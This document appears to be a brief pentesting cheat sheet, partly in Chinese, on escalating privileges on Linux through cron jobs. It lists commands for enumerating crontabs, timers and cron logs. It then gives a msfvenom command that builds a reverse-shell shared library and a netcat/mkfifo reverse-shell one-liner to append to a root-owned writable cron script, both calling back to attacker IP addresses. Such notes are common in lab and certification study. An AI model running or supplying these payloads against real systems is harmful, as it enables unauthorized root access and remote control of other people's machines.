- when u find some thing interesting(like a **scheduled installed app** to run).U can follow the app to modify its file to Gain PE
### Cronjob Info
```bash
ls -lah /etc/cron*


cat /etc/crontab
cat /etc/anacrontab
cat /etc/frontal
cat /etc/anacron
systemctl list-timers --all

crontab -l
sudo crontab -l
grep "CRON" /var/log/syslog
cat /var/log/cron.log
ls -lah {Cron_job_priv}
```
### Share Lib
```bash
ldd <binary>

# 查看/etc/crontab中的LD_LIBRARY_PATH
#e.g. LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.199 LPORT=8089 -f elf-so reverse.so
```
# Exploit
## Abuse CronJobs
```bash
#在root的定时任务的可写脚本下，加入回弹shell语句
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >>  <corn_job_file>
```

